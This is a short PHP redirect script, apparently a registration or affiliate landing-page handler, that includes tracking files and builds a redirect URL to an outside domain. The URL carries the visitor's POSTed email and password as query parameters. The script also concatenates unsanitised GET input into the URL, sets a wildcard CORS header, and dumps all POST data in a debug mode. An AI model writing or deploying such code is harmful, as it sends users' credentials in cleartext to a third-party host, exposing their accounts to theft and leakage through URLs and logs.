<?php
header('Access-Control-Allow-Origin: *');
include('./ga.php');
include('./inboxsuite.php');
include('./postback.php');
include('./registration.php');
$redirect = "https://fastlnd.com/ep.php/JK-prmagms:76778/69281:".$_GET['k1']."_".$_GET['k2'].".clickid?EX1=".$_POST['email']."&EX2=".$_POST['password'];;
if(isset($_GET['debug']) && isset($_GET['print'])) {
	var_dump($_POST);
	echo '<br/><br/>';
	echo $redirect;
} 
else if(isset($_GET['getlink'])) {
	echo $redirect;
} else {
	header("HTTP/1.1 301 Moved Permanently");
	header("Location: ".$redirect);
}
exit();
?>
